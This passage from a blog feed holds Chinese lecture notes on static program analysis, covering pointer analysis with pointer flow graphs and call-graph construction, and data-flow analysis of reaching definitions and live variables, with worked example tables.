    </entry>
    
    
    
    <entry>
      <title>指针分析基础</title>
      <link href="/2022/12/18/Security/software%20analysis/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/12/18/Security/software%20analysis/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h3 id="目录">目录：</h3><ol><li>指针分析规则</li><li>如何实现指针分析</li><li>指针分析算法</li><li>指针分析如何处理函数调用（过程间指针分析）</li></ol><h3 id="重点">重点：</h3><p>理解指针分析的规则、指针流图PFG、指针分析算法。</p><p>理解指针分析调用函数的规则、过程间指针分析算法、实时调用图构建。</p><hr><h1 id="1指针分析规则">1.指针分析规则</h1><p><strong>首先分析前4种语句</strong>：New / Assign / Store / Load。</p><p><strong>指针分析的域和相应的记法</strong>：变量/函数/对象/实例域/指针，用pt表示程序中的指向关系（映射）。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241012464.webp" alt="img"></p><p>7-1-1-标记方法.png</p><p><strong>规则</strong>：采用推导形式，横线上面是条件，横线下面是结论。</p><ul><li><p>New：创建对象，将<code>new T()</code>对应的对象oi加入到x的指针集。</p></li><li><p>Assign：将y的指针集加入到x对应的指针集。</p></li><li><p>Store：让oi的field指向oj。</p></li><li><p>Load：Store的反操作。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241012461.webp" alt="img"></p><p>7-1-2-规则.png</p></li></ul><hr><h1 id="2如何实现指针分析">2.如何实现指针分析</h1><p><strong>算法要求</strong>：全程序指针分析，要容易理解和实现。</p><p><strong>本质</strong>：在指针（变量/域）之间传递指向信息。Andersen-style分析（很普遍）——很多solving system把指针分析看作是一种包含关系，eg，<code>x = y</code>，x包含y。</p><p><strong>问题</strong>：当一个指针的指向集发生变化，必须更新与它相关的其他指针。如何表示这种传递关系？PFG。</p><p><strong>PFG</strong>：用指针流图PFG来表示指针之间的关系，PFG是<strong>有向图</strong>。</p><ul><li>Nodes：Pointer = V U (O x F)    节点n表示一个变量或抽象对象的域。</li><li>Edges：Pointer X Pointer   边x -&gt; y 表示指针x指向的对象may会流入指针y。</li></ul><p><strong>Edges添加规则</strong>：根据程序语句 + 对应的规则。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241012456.webp" alt="img"></p><p>7-2-1-PFG边规则.png</p><p><strong>示例</strong>：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241012467.webp" alt="img"></p><p>7-2-2-PFG示例.png</p><p><strong>PTA步骤</strong>：</p><ol><li>构造PFG（根据以上示例，PFG也受指向关系影响）</li><li>根据PFG传播指向信息</li></ol><hr><h1 id="3指针分析算法">3.指针分析算法</h1><h4 id="1过程内pta算法">（1）过程内PTA算法</h4><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241012472.webp" alt="img"></p><p>7-3-0-PTA算法_过程内.png</p><p><strong>符号</strong>：</p><ul><li>S：程序语句的集合。</li><li>WL：Work list，待合并的指针信息，二元组的集合，&lt;指针n，指向的对象集合pts&gt;。pts将被加入到n的指向集pt(n)中。</li><li>PFG：指针流图。</li></ul><p><strong>步骤</strong>：对每种语句都是基于第1小节的规则来实现。</p><ol><li>对S中所有类似**New <code>x = new T()</code>**的语句，将&lt;x, {oi}&gt;加入到WL。</li><li>对S中所有类似**Assign <code>x = y</code>**的语句，调用<code>AddEdge()</code>将<code>y -&gt; x</code>加入到PFG，&lt;x, pt(y)&gt;加入到WL（传播指向信息）。</li><li>遍历WL，取一个元素&lt;n, pts&gt;，除去pts中与pt(n)重复的对象得到<img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241012374.svg" alt="\Delta">，调用Propagate(n,<img src="https://math.jianshu.com/math?formula=%5CDelta" alt="\Delta">)将<img src="https://math.jianshu.com/math?formula=%5CDelta" alt="\Delta">加入到pt(n)，且取出PFG中所有n指向的边<code>n-&gt;s</code>，将&lt;s, pts&gt;加入到WL（根据PFG将指向信息传递给同名指针）。</li><li>如果n表示一个变量x（x跟Store/Load指令相关），对<img src="https://math.jianshu.com/math?formula=%5CDelta" alt="\Delta">中的每个对象oi。对S中所有类似**Store <code>x.f = y</code><strong>的语句，调用<code>AddEdge()</code>将<code>y -&gt; oi.f</code>加入到PFG，&lt;oi.f, pt(y)&gt;加入到WL（传播指向信息）；对S中所有类似</strong>Load <code>y = x.f</code>**的语句，调用<code>AddEdge()</code>将<code>oi.f -&gt; y</code>加入到PFG，&lt;y, pt(oi.f)&gt;加入到WL（传播指向信息）。</li></ol><p><strong>问题</strong>：</p><ol><li>为什么要去重？避免冗余，英文叫做Differential propagation差异传播。</li><li>指针集用什么数据结构存储？混合集 Hibra-set，集合元素小于16个用hash set，大于16个用big-rector 位存储。</li><li>开源项目有哪些？<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fsable.github.io%2Fsoot%2F">Soot</a>、<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwala.sourceforge.net%2Fwiki%2Findex.php%2FMain_Page">WALA</a>、<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fpag-www.gtisc.gatech.edu%2Fchord%2Fuser_guide%2F">Chord</a>。</li></ol><h4 id="2示例">（2）示例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> b = new C(); </span><br><span class="line"><span class="number">2</span> a = b;</span><br><span class="line"><span class="number">3</span> c = new C(); </span><br><span class="line"><span class="number">4</span> c.f = a;</span><br><span class="line"><span class="number">5</span> d = c;</span><br><span class="line"><span class="number">6</span> c.f = d; </span><br><span class="line"><span class="number">7</span> e = d.f;</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center"></th><th style="text-align:center">WL</th><th style="text-align:center">正处理</th><th style="text-align:center">PFG</th><th>指针集</th><th>处理语句</th><th>算法语句</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">[&lt;b, {o1}&gt;, &lt;c, {o3}&gt;]</td><td style="text-align:center"></td><td style="text-align:center"></td><td></td><td>1，3</td><td>处理New</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">[&lt;b, {o1}&gt;, &lt;c, {o3}&gt;]</td><td style="text-align:center"></td><td style="text-align:center">a&lt;-b；d&lt;-c；</td><td></td><td>2，4</td><td>处理Assign</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">[&lt;c, {o3}&gt;]</td><td style="text-align:center">&lt;b, {o1}&gt;</td><td style="text-align:center">a&lt;-b；d&lt;-c；</td><td>pt(b)={o1}</td><td></td><td>while开头</td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">[&lt;c, {o3}&gt;], &lt;a, {o1}&gt;]</td><td style="text-align:center"></td><td style="text-align:center">a&lt;-b；d&lt;-c；</td><td></td><td></td><td>Propagate()传递，没有b.f语句</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">[&lt;a, {o1}&gt;]</td><td style="text-align:center">&lt;c, {o3}&gt;</td><td style="text-align:center">a&lt;-b；d&lt;-c；</td><td>pt©={o3}</td><td></td><td>while开头</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center">[&lt;a, {o1}&gt;, &lt;d, {o3}&gt;]</td><td style="text-align:center"></td><td style="text-align:center">a&lt;-b；d&lt;-c；</td><td></td><td></td><td>Propagate()传递，有c.f语句</td></tr><tr><td style="text-align:center">7</td><td style="text-align:center">[&lt;a, {o1}&gt;, &lt;d, {o3}&gt;]</td><td style="text-align:center"></td><td style="text-align:center">a&lt;-b；d&lt;-c；o3.f&lt;-a；o3.f&lt;-d；  <img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241012907.webp" alt="img"> 7-3-1-PFG.png</td><td></td><td>4，6</td><td>处理Store/Load，添加边</td></tr><tr><td style="text-align:center">8</td><td style="text-align:center">[&lt;d, {o3}&gt;]</td><td style="text-align:center">&lt;a, {o1}&gt;</td><td style="text-align:center"></td><td>pt(a)={o1}；</td><td></td><td>while开头</td></tr><tr><td style="text-align:center">9</td><td style="text-align:center">[&lt;d, {o3}&gt;,&lt;o3.f, {o1}&gt;]</td><td style="text-align:center"></td><td style="text-align:center"></td><td></td><td></td><td>Propagate()传递</td></tr><tr><td style="text-align:center">10</td><td style="text-align:center">[&lt;o3.f, {o1}&gt;]</td><td style="text-align:center">&lt;d, {o3}&gt;</td><td style="text-align:center"></td><td>pt(d)={o3}</td><td></td><td>while开头</td></tr><tr><td style="text-align:center">11</td><td style="text-align:center">[&lt;o3.f, {o1}&gt;, &lt;o3.f, {o3}&gt;]</td><td style="text-align:center"></td><td style="text-align:center"></td><td></td><td></td><td>Propagate()传递，有d.f语句</td></tr><tr><td style="text-align:center">12</td><td style="text-align:center">[&lt;o3.f, {o1}&gt;, &lt;o3.f, {o3}&gt;]</td><td style="text-align:center"></td><td style="text-align:center">a&lt;-b；d&lt;-c；o3.f&lt;-a；o3.f&lt;-d；e&lt;-o3.f；  <img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241012751.webp" alt="img"> 7-3-2-PFG.png</td><td></td><td>7</td><td>处理Load，添加边</td></tr><tr><td style="text-align:center">13</td><td style="text-align:center">[&lt;o3.f, {o3}&gt;]</td><td style="text-align:center">&lt;o3.f, {o1}&gt;</td><td style="text-align:center"></td><td>pt(o3.f)={o1}；</td><td></td><td>while开头</td></tr><tr><td style="text-align:center">14</td><td style="text-align:center">[&lt;o3.f, {o3}&gt;, &lt;e, {o1}&gt;]</td><td style="text-align:center"></td><td style="text-align:center"></td><td></td><td></td><td>Propagate()传递</td></tr><tr><td style="text-align:center">15</td><td style="text-align:center">[&lt;e, {o1}&gt;]</td><td style="text-align:center">&lt;o3.f, {o3}&gt;</td><td style="text-align:center"></td><td>pt(o3.f)={o1, o3}</td><td></td><td>while开头</td></tr><tr><td style="text-align:center">16</td><td style="text-align:center">[&lt;e, {o1}&gt;, &lt;e, {o3}&gt;]</td><td style="text-align:center"></td><td style="text-align:center"></td><td></td><td></td><td>Propagate()传递</td></tr><tr><td style="text-align:center">17</td><td style="text-align:center"></td><td style="text-align:center">&lt;e, {o1}&gt;；&lt;e, {o3}&gt;</td><td style="text-align:center"><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241012778.webp" alt="img"> 7-3-3-PFG.png</td><td>pt(e)={o1, o3}</td><td></td><td>while开头</td></tr></tbody></table><hr><h1 id="4指针分析如何处理函数调用">4.指针分析如何处理函数调用</h1><p><strong>构造调用图技术对比</strong>：</p><ul><li>CHA：基于声明类型，不精确，引入错误的调用边和指针关系。</li><li>指针分析：基于pt(a)，即a指向的类型，更精确，构造更准的CG并对指针分析有正反馈（所以过程间指针分析和CG构造同时进行，很复杂）。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">(A a)</span> &#123;   <span class="comment">// pt(a) = ???</span></span><br><span class="line">  ...</span><br><span class="line">    b = a.bar();    <span class="comment">// pt(b) = ???  把a的指向分析清楚了，就能确定a.bar()到底调用哪个对象的bar()函数，那么b的指向也明确了。</span></span><br><span class="line">    ... </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1调用语句规则">（1）调用语句规则</h4><p><strong>call语句规则</strong>：主要分为4步。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241012806.webp" alt="img"></p><p>7-4-1-call规则.png</p><ol><li><strong>找目标函数m</strong>：Dispatch(oi, k)——找出pt(x)，也即oi类型对象中的k函数。</li><li><strong>receiver object</strong>：把x指向的对象（<code>pt(x)</code>）传到m函数的this变量，即mthis</li><li><strong>传参数</strong>：pt(aj), 1&lt;=j&lt;=n  传给m函数，即p(mpj), 1&lt;=j&lt;=n。<strong>建立PFG边</strong>，a1-&gt;mp1，…，an-&gt;mpn。</li><li><strong>传返回值</strong>：pt(mret)传给pt®。<strong>建立PFG边</strong>，r&lt;-mret。</li></ol><p><strong>问题</strong>：为什么PFG中不添加x-&gt;mthis边？因为mthis只和自己这个对象相关，而可能有pt(x)={new A, new B, new C}，指定对象的x只流向对应的对象，是无法跨对象传递的。</p><h4 id="2过程间pta算法">（2）过程间PTA算法</h4><p><strong>问题</strong>：由于指针分析和CG构造互相影响，所以每次迭代只分析可达的函数和语句。然后不断发现和分析新的可达函数。</p><p><strong>可达示例</strong>：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241012783.webp" alt="img"></p><p>7-4-2-可达示例.png</p><p><strong>算法</strong>：黄色背景的代码是和过程内分析不同的地方。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241012835.webp" alt="img"></p><p>7-4-3-PTA算法_过程间.png</p><p><strong>符号</strong>：</p><ul><li>mentry：入口main函数</li><li>Sm：函数m中的语句</li><li>S：可达语句的集合（就是RM中的语句）</li><li>RM：可达函数的集合</li><li>CG：调用图的边</li></ul><p><strong>步骤</strong>：基于调用规则来实现。</p><ol><li>首先调用<strong>AddReachable(mentry)</strong>，将入口函数mentry的语句加到S中。处理**New <code>x = new T()</code><strong>语句，把&lt;x, {oi}&gt;加入到WL；处理</strong>Assign <code>x = y</code>**语句，调用<code>AddEdge(y, x)</code>加入边到PFG。</li><li>跟过程内指针分析一样，遍历WL，取一个元素&lt;n, pts&gt;，除去pts中与pt(n)重复的对象得到<img src="https://math.jianshu.com/math?formula=%5CDelta" alt="\Delta">，调用Propagate(n,<img src="https://math.jianshu.com/math?formula=%5CDelta" alt="\Delta">)将<img src="https://math.jianshu.com/math?formula=%5CDelta" alt="\Delta">加入到pt(n)，且取出PFG中所有n指向的边<code>n-&gt;s</code>，将&lt;s, pts&gt;加入到WL（根据PFG将指向信息传递给同名指针）。</li><li>如果n表示一个变量x（x跟Store/Load指令相关），对<img src="https://math.jianshu.com/math?formula=%5CDelta" alt="\Delta">中的每个对象oi。对S中所有类似**Store <code>x.f = y</code><strong>的语句，调用<code>AddEdge()</code>将<code>y -&gt; oi.f</code>加入到PFG，&lt;oi.f, pt(y)&gt;加入到WL（传播指向信息）；对S中所有类似</strong>Load <code>y = x.f</code>**的语句，调用<code>AddEdge()</code>将<code>oi.f -&gt; y</code>加入到PFG，&lt;y, pt(oi.f)&gt;加入到WL（传播指向信息）。</li><li>最后调用<strong>ProcessCall(x, oi)</strong>，处理与x相关的<strong>call指令</strong>。取出S中类似<code>r = x.k(a1,...,an)</code>的调用语句L，首先调用Dispatch(oi, k)解出调用的目标函数m，把&lt;mthis, {oi}&gt;加入到WL（传递接收对象，上下文敏感分析将用到），将<code>L-&gt;m</code>这条调用边加入到CG；调用**AddReachable(m)**将新的语句加入到S，并处理New/Assign语句；调用AddEdge()将<code>实参-&gt;形参</code>、<code>返回值-&gt;r</code>边加入到PFG（传递参数、返回值），并将<code>&lt;形参,pt(实参)&gt;</code>、<code>&lt;r,pt(返回值)&gt;</code>加入到WL。</li></ol><p><strong>问题</strong>：为什么ProcessCall(x, oi)中，要判断<code>L-&gt;m</code>这条边是否已经加入到CG？因为x可能指向多个对象，就会多次处理L这个调用指令，可能x中别的对象oj早就已经将这条边加入进去了。</p><h4 id="3示例">（3）示例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line"><span class="number">2</span>   <span class="type">static</span> <span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="number">3</span>       A a = new A();</span><br><span class="line"><span class="number">4</span>       A b = new B();</span><br><span class="line"><span class="number">5</span>       A c = b.foo(a);</span><br><span class="line"><span class="number">6</span>   &#125;</span><br><span class="line"><span class="number">7</span>   A <span class="title function_">foo</span><span class="params">(Ax)</span>&#123;...&#125;</span><br><span class="line"><span class="number">8</span> &#125;</span><br><span class="line"><span class="number">9</span> <span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="title">extends</span> <span class="title">A</span> &#123;</span>  </span><br><span class="line"><span class="number">10</span>  A <span class="title function_">foo</span><span class="params">(A y)</span> &#123;</span><br><span class="line"><span class="number">11</span>      A r=newA();</span><br><span class="line"><span class="number">12</span>      <span class="keyword">return</span> r;</span><br><span class="line"><span class="number">13</span>      &#125;</span><br><span class="line"><span class="number">14</span>  &#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:center"></th><th style="text-align:center">WL</th><th style="text-align:center">正处理</th><th style="text-align:center">PFG</th><th style="text-align:center">指针集</th><th style="text-align:center">RM</th><th style="text-align:center">CG</th><th style="text-align:center">语句</th><th>算法语句</th></tr></thead><tbody><tr><td style="text-align:center">1</td><td style="text-align:center">[]</td><td style="text-align:center"></td><td style="text-align:center">{}</td><td style="text-align:center"></td><td style="text-align:center">{}</td><td style="text-align:center">{}</td><td style="text-align:center"></td><td>初始化</td></tr><tr><td style="text-align:center">2</td><td style="text-align:center">[]</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center">{A.main()}</td><td style="text-align:center"></td><td style="text-align:center">1，2</td><td>AddReachable(mentry)</td></tr><tr><td style="text-align:center">3</td><td style="text-align:center">[&lt;a,{o3}&gt;, &lt;b,{o4}&gt;]</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center">3，4</td><td></td></tr><tr><td style="text-align:center">4</td><td style="text-align:center">[&lt;b,{o4}&gt;]</td><td style="text-align:center">&lt;a,{o3}&gt;</td><td style="text-align:center"></td><td style="text-align:center">pt(a)={o3}；</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td>while开头</td></tr><tr><td style="text-align:center">5</td><td style="text-align:center">[]</td><td style="text-align:center">&lt;b,{o4}&gt;</td><td style="text-align:center"></td><td style="text-align:center">pt(b)={o4}</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td>while开头</td></tr><tr><td style="text-align:center">6</td><td style="text-align:center">[]</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center">5</td><td>ProcessCall(b, o4)</td></tr><tr><td style="text-align:center">7</td><td style="text-align:center">[&lt;B.foothis, {o4}&gt;]</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center">{5-&gt;B.foo(A)}</td><td style="text-align:center"></td><td>m=Dispatch(o4, foo())=B.foo()；添加到调用图</td></tr><tr><td style="text-align:center">8</td><td style="text-align:center">[&lt;B.foothis, {o4}&gt;, &lt;r, o11&gt;]</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center">{A.main(), B.foo()}</td><td style="text-align:center"></td><td style="text-align:center"></td><td>AddReachable(B.foo())；添加到可达函数</td></tr><tr><td style="text-align:center">9</td><td style="text-align:center">[&lt;B.foothis, {o4}&gt;, &lt;r, o11&gt;, &lt;y, {o3}&gt;]</td><td style="text-align:center"></td><td style="text-align:center">{a-&gt;y, r-&gt;c}    <img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241012987.webp" alt="img"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td>AddEdge()；添加参数边、返回值边</td></tr><tr><td style="text-align:center">10</td><td style="text-align:center">[&lt;r, o11&gt;, &lt;y, {o3}&gt;]</td><td style="text-align:center">&lt;B.foothis, {o4}&gt;</td><td style="text-align:center"></td><td style="text-align:center">pt(B.foothis)={o4}；</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td>while开头，B.foothis没有调用任何函数</td></tr><tr><td style="text-align:center">11</td><td style="text-align:center">[&lt;y, {o3}&gt;, &lt;c, {o11}&gt;]</td><td style="text-align:center">&lt;r, o11&gt;</td><td style="text-align:center"></td><td style="text-align:center">pt®={o11}；</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td>while开头</td></tr><tr><td style="text-align:center">12</td><td style="text-align:center"></td><td style="text-align:center">&lt;y, {o3}&gt;, &lt;c, {o11}&gt;</td><td style="text-align:center"></td><td style="text-align:center">pt(y)={o3}；pt©={o11}</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td>while开头</td></tr></tbody></table><p>如果是CHA的话，CG={5-&gt;B.foo(A), <strong>5-&gt;A.foo(A)</strong>}，错误识别为调用边。</p><p><strong>结果</strong>：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241012023.webp" alt="img"></p><p>7-4-5-result.png</p><p><strong>问题</strong>：没有入口函数的？如对库函数处理，生成调用库函数的程序。</p>]]></content>
      
      
      <categories>
          
          <category> 软件分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据流分析</title>
      <link href="/2022/12/18/Security/software%20analysis/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90/"/>
      <url>/2022/12/18/Security/software%20analysis/%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90-%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="目录">目录：</h3><ol><li>数据流分析总览</li><li>预备知识</li><li>Reaching Definitions Analysis (may analysis)</li><li>Live Variables Analysis (may analysis)</li><li>Available Expressions Analysis (must analysis)</li></ol><h3 id="重点">重点：</h3><ul><li>理解3种数据流分析的含义，如何设计类似的算法，如何优化</li><li>理解3种数据流分析的共性与区别</li><li>理解迭代算法并弄懂算法为什么能停止</li></ul><hr><h2 id="1数据流分析总览">1.数据流分析总览</h2><blockquote><p>may analysis：输出可能正确的信息（需做over-approximation优化，才能成为Safe-approximation安全的近似，可以有误报-completeness），注意大多数静态分析都是may analysis</p><p>must analysis：输出必须正确的信息（需做under-approximation优化，才能成为Safe-approximation安全的近似，可以有漏报-soundness）</p></blockquote><p>Nodes (BBs/statements)、Edges (control flows)、CFG (a program)</p><p><strong>例如</strong>：</p><blockquote><p>application-specific Data &lt;- <code>abstraction</code> (+/-/0)</p><p>Nodes &lt;- <code>Transfer function</code></p><p>Edges &lt;- <code>Control-flow handling</code></p></blockquote><p>不同的数据流分析 有 不同的数据<strong>抽象表达</strong> 和 不同的<strong>安全近似策略</strong>，如 不同的 <strong>转换规则</strong> 和 <strong>控制流</strong>处理。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241000785.webp" alt="img"></p><p>2-1-数据流分析总览.png</p><hr><h2 id="2预备知识">2.预备知识</h2><p><strong>输入/输出状态</strong>：程序执行前/执行后的状态（本质就是抽象表达的数据的状态，如变量的状态）。</p><p><strong>数据流分析的结果</strong>：最终得到，每一个程序点对应一个数据流值(data-flow value)，表示该点所有可能程序状态的一个抽象。例如，我只关心x、y的值，我就用抽象来表示x、y所有可能的值的集合（输入/输出的值域/约束），就代表了该程序点的程序状态。</p><blockquote><p>Forward Analysis前向分析：按程序执行顺序的分析。OUT[s]=fs(IN[s])，s-statement</p><p>Backward Analysis反向分析：逆向分析。IN[s]=fs(OUT[s])</p></blockquote><p><strong>控制流约束</strong>：约束求解做的事情，推断计算输入到输出，或反向分析。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241000769.webp" alt="img"></p><p>2-2-控制流约束.png</p><hr><h2 id="3reaching-definitions-analysis-may-analysis">3.Reaching Definitions Analysis (may analysis)</h2><p><strong>问题定义</strong>：给变量v一个定义d（赋值），存在一条路径使得程序点p能够到达q，且在这个过程中不能改变v的赋值。</p><p><strong>应用举例</strong>：检测未定义的变量，若v可达p且v没有被定义，则为未定义的变量。</p><p><strong>抽象表示</strong>：设程序有n条赋值语句，用n位向量来表示能reach与不能reach。</p><h4 id="1公式分析">（1）公式分析</h4><p>什么是definition？ <code>D: v = x op y</code>    类似于赋值。</p><p><strong>Transfer Function</strong>：OUT[B] = genB U (IN[B] - killB) ——怎么理解，就是基于转换规则而得到。</p><p><strong>解释</strong>：基本块B的输出 = 块B内的所有变量v的定义（赋值/修改）语句  U （块B的输入 - 程序中其它所有定义了变量v的语句）。本质就是本块与前驱修改变量的语句 作用之和（去掉前驱的重复修改语句）。</p><p><strong>Control Flow</strong>：IN[B] = Up a_predecesso_of_B Out[P] ——怎么理解，就是基于控制流而得到。</p><p><strong>解释</strong>：基本块B的输入 = 块B所有前驱块P的输出的并集。注意，所有前驱块意味着只要有一条路径能够到达块B，就是它的前驱，包括条件跳转与无条件跳转。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241000762.webp" alt="img"></p><p>2-3-1-Reaching_Definition.png</p><h4 id="2算法">（2）算法</h4><p><strong>目的</strong>：输入CFG，计算好每个基本块的killB（程序中其它块中定义了变量v的语句）和genB（块B内的所有变量v的定义语句），输出每个基本块的IN[B]和OUT[B]。</p><p><strong>方法</strong>：首先所有基本块的OUT[B]初始化为空。遍历每一个基本块B，按以上两个公式计算块B的IN[B]和OUT[B]，只要这次遍历时有某个块的OUT[B]发生变化，则重新遍历一次（因为程序中有循环存在，只要某块的OUT[B]变了，就意味着后继块的IN[B]变了）。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241000773.webp" alt="img"></p><p>2-3-2-可达性分析算法.png</p><h4 id="3实例">（3）实例：</h4><p><strong>抽象表示</strong>：设程序有n条赋值语句，用n位向量来表示能reach与不能reach。</p><p><strong>说明</strong>：红色-第1次遍历；蓝色-第2次遍历；绿色-第3次遍历。</p><p><strong>结果</strong>：3次遍历之后，每个基本块的OUT[B]都不再变化。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241000780.webp" alt="img"></p><p>2-3-3遍历实例.png</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241000686.png" alt="image-20210507134806554"></p><p>现在，我们可以回想一下，数据流分析的目标是，最后得到了，每个程序点关联一个数据流值（该点所有可能的程序状态的一个抽象表示，也就是这个n位向量）。在这个过程中，我们对个基本块，不断利用基于转换规则的语义（也就是transfer functions，构成基本块的语句集）-<code>OUT[B]</code>、控制流的约束-<code>IN[B]</code>，最终得到一个稳定的安全的近似约束集。</p><h4 id="4算法会停止吗">（4）算法会停止吗？</h4><p>OUT[B] = genB U (IN[B] - killB)</p><p><strong>大致理解</strong>：genB和 killB是不变的，只有IN[B]在变化，所以说OUT[B]只会增加不会减少，n向量长度是有限的，所以最终肯定会停止。具体涉及到不动点证明，后续课程会讲解。</p><hr><h2 id="4live-variables-analysis-may-analysis">4.Live Variables Analysis (may analysis)</h2><p><strong>问题定义</strong>：某程序点p处的变量v，从p开始到exit块的CFG中是否有某条路径用到了v，如果用到了v，则v在p点为live，否则为dead。其中有一个隐含条件，在点p和引用点之间不能重定义v。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241000030.webp" alt="img"></p><p>2-4-1-live_variables定义.png</p><p><strong>应用场景</strong>：可用于寄存器分配，如果寄存器满了，就需要替换掉不会被用到的变量。</p><p><strong>抽象表示</strong>：程序中的n个变量用长度为n bit的向量来表示，对应bit为1，则该变量为live，反之为0则为dead。</p><h4 id="1公式分析-2">（1）公式分析</h4><p><strong>Control Flow</strong>：OUT[B] = US a_successor_of_BIN[S]</p><p><strong>理解</strong>：我们是前向分析，只要有一条子路是live，父节点就是live。</p><p><strong>Transfer Function</strong>：IN[B] = useB U (OUT[B] - defB)</p><p><strong>理解</strong>：IN[B] = 本块中use出现在define之前的变量 U （OUT[B]出口的live情况 - 本块中出现了define的变量）。define指的是定义/赋值。</p><p><strong>特例分析</strong>：如以下图所示，第4种情况，v=v-1，实际上use出现在define之前，v是使用的。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241000096.webp" alt="img"></p><p>2-4-2-公式推导.png</p><h4 id="2算法-2">（2）算法</h4><p><strong>目的</strong>：输入CFG，计算好每个基本块中的defB（重定义）和useB（出现在重定义之前的使用）。输出每个基本块的IN[B]和OUT[B]。</p><p><strong>方法</strong>：首先初始化每个基本块的IN[B]为空集。遍历每一个基本块B，按以上两个公式计算块B的OUT[B]和IN[B]，只要这次遍历时有某个块的IN[B]发生变化，则重新遍历一次（因为有循环，只要某块的IN[B]变了，就意味前驱块的OUT[B]变了）。</p><p><strong>问题</strong>：遍历基本块的顺序有要求吗？ 没有要求，但是会影响遍历的次数。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404241000117.webp" alt="img"></p><p>2-4-3-live_variables算法.png</p><p><strong>初始化规律</strong>：一般情况下，may analysis 全部初始化为空，must analysis全部初始化为all。</p><h4 id="3实例-2">（3）实例</h4><p><strong>抽象表示</strong>：程序中的n个变量用长度为n 